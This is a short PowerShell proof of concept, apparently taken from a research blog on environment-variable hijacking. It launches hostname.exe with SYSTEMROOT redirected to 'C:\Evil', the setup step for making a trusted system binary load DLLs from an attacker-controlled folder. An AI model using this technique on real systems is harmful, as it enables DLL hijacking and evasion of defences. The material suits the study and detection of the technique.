# The following script can be used to load a process with a modified environment variable.
# If you'd be changing it simply with $env:SYSTEMROOT, this would affect the whole powershell process
# and probably break a lot of stuff in this process!
# 
# Source: https://www.wietzebeukema.nl/blog/save-the-environment-variables

$s = New-Object System.Diagnostics.ProcessStartInfo
$s.FileName="C:\windows\system32\hostname.exe"
$s.EnvironmentVariables.Remove("SYSTEMROOT")
$s.EnvironmentVariables.Add("SYSTEMROOT", "C:\Evil")
$s.UseShellExecute = $false
$p = New-Object System.Diagnostics.Process
$p.StartInfo = $s
$p.Start()
